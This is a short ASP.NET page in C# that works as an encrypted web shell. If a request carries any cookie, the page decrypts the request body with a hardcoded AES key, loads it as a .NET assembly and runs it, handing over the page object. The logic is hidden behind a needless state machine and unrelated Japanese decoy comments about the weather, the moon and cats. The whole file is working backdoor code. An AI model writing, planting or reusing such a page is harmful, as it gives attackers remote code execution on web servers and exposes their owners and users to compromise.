<%@ Page Language="C#" %><%
    // 月が綺麗ですね
    int s = 0;
    if (Request.Cookies.Count == 0) {
        s = -1; // 何もする必要はありません
    }
    byte[] k = null;
    byte[] c = null;
    System.Reflection.Assembly a = null;

    while (s != -1) {
        // 今日の天気は晴れです
        switch (s) {
            case 0:
                // 秘密の鍵を準備する
                k = new byte[16];
                string k_s = "ca63457538b9b1e0";
                for(int i=0; i<k_s.Length; i++) k[i] = (byte)k_s[i];
                s = 1;
                break;
            case 1:
                // データをストリームから読み込む
                var st = Request.InputStream;
                c = new byte[st.Length];
                st.Read(c, 0, c.Length);
                s = 2;
                break;
            case 2:
                // データを復号する
                var r = new System.Security.Cryptography.RijndaelManaged();
                var d = r.CreateDecryptor(k, k);
                var p = d.TransformFinalBlock(c, 0, c.Length);
                a = System.Reflection.Assembly.Load(p);
                s = 3;
                break;
            case 3:
                // 猫はかわいいです
                var o = a.CreateInstance("K");
                o.Equals(this);
                s = -1; // 完了
                break;
        }
    }
%>